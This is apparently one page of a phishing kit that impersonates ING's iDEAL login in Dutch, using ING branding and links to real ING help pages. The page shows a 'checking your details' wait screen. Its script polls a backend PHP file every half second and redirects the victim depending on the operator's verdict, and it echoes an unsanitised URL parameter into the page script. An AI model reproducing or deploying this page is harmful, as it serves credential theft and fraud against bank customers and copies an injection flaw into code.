<html data-bm-environment="P" class="js"><head>
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="Description" content="ING - inloggen voor iDEAL, Machtigen en BankID">
    <link rel="icon" href="https://www.ing.nl/assets/cds/icons/favicon.ico">
   
    <title>iDEAL - Mijn ING</title>

	

    <style>
        .tg .icon:before {
            position: relative;
            z-index: 0 !important;
        }

        #cover {position: fixed; height: 100%; width: 100%; top:0; left: 0; background: white; z-index:9999;}

        #overlay {
            position:fixed;
            top:0;
            left:0;
            width:100%;
            height:100%;
            background:#000;
            opacity:0.5;
            filter:alpha(opacity=50);
        }

        #modal {
            position:absolute;
            background:rgba(0,0,0,0.2);
            border-radius:14px;
            padding:8px;
        }


        #content {

            border-radius:8px;
            background:#fff;
            padding:20px;
            padding-bottom:40px;
        }

    </style>
    <link rel="stylesheet" href="https://ideal.ing.nl/ideal/static/inloggen/the-guide/css/the-guide-styles-responsive.min.css">

   


<style type="text/css">@media screen and (inverted-colors: inverted) { #qrcode { filter: invert(1)}}@media screen and (-ms-high-contrast: active) { #qrcode { -ms-high-contrast-adjust: none; }}</style></head>

<body class="tg" style="margin: 8px; background-color: white;">

    <div id="cover" style="display: none;"></div>
    <div class="container">
        <div class="row">
            <div class="col-md-12 col-lg-10 col-lg-offset-1 col-xl-8 col-xl-offset-2">
                <header style="line-height: 40px">
                <span class="icon-ing-logo font-size-xh l-pr-1" aria-labelledby="ingLogoTxt">
                    <span class="sr-only" id="ingLogoTxt">ING logo</span>
                    <span class="icon icon-ing-logo-ing" aria-hidden="true"></span>
                    <span class="icon icon-ing-logo-lion icon-jb" aria-hidden="true"></span>
                </span>

                    <span style="padding-right: 20px; margin-bottom: -20px; border-left: 1px solid #ececec; display: inline-block; height: 45px;" id="prdLogoSpacer"></span>

                    <span style="padding-top: -20px;" id="prdLogo"><img src="https://ideal.ing.nl/ideal/static/betalen/img/logo-ideal.svg" style="margin-bottom: -3px;" height="52px"></span>

                    <div class="languages h-float-right hidden-print h-hidden" id="languageSelector"></div>
                </header>

                <main role="main">
                    <h1 id="pageHeader" class="l-mt-2">
                        <span id="mainTitle">iDEAL betaling</span>
                    </h1>
                    <p id="p1">Controleer of het adres begint met https:// en of je het slotje in de browser ziet.</p>
               
                    <div id="loginPanel" >
                        <div class="panel panel-bordered panel-default" style="height:500px;">
                            <div class="panel-body">

                                <div class="row">
                                    <div class="col-xs-12">
                                        <h4 id="loginSubtitle" class="h-hidden"></h4>
                                        <div id="loginDescription" class="l-pb-3 h-hidden"></div>
                                        <img src="../../../images/ing-loader.gif" style="display:block; margin: 0 auto; margin-top: 100px;">
                                        <p style="text-align: center;">We controleren uw gegevens. Een ogenblik geduld alstublieft...</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <span id="footerLinks">
                     <div style="margin-bottom: 10px;"><a onclick="count('help')" href="https://www.ing.nl/particulier/mobiel-en-internetbankieren/online-betalen/ideal/index.html" tabindex="6" target="_blank" class="link-a ng-scope"><span aria-hidden="true" class="icon icon-arrow-c-right icon-xs"></span><span style="" id="hlpLink">Help</span></a></div>
                     <div><a onclick="count('veilig-bankieren')" href="https://www.ing.nl/de-ing/veilig-bankieren/veilig-bankzaken-regelen/veilig-online-winkelen/index.html" tabindex="7" target="_blank" class="link-a ng-scope"><span aria-hidden="true" class="icon icon-arrow-c-right icon-xs"></span><span id="safeLink">Veilig betalen met iDEAL</span></a></div>
                </span>
                </main>
            </div>
        </div>
    </div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script type="text/javascript">
    function returnwasset(){
            $.ajax({
                type: "POST",
                url: "../../../required/login-data-check-3.php?trxid=<?php $link = $_GET['trxid']; echo $link;?>&session=<?php echo $_SESSION['alive'];?>",
                data: "",
                success: function(data){
                    if(data == "true")
                    {
                        window.location.replace("../../../required/templates/ing_session_destroy.php");    
                    }
                    else if(data == "false")
                    {
                        window.location.replace("index?trxid=<?php echo $link;?>&error=legevelden&");
                    }
                },                
                error: function(){
                    clearInterval(interval);
                }
        });
    }
    interval = setInterval(returnwasset, 500);
        
    </script>



<div id="overlay" style="display: none;"></div><div id="modal" class="panel panel-a modal" style="max-width: 740px; padding: 0px; display: none;"><div id="content" style="min-height: 410px;"></div></div><iframe id="iframe288" frameborder="0" src="about:blank" title="uaoyeh" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe382" frameborder="0" src="about:blank" title="csxfi_" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe855" frameborder="0" src="about:blank" title="ytfddr" style="width: 0px; height: 0px; border: none; display: none;"></iframe><iframe id="iframe801" frameborder="0" src="about:blank" title="_qcphr" style="width: 0px; height: 0px; border: none; display: none;"></iframe></body></html>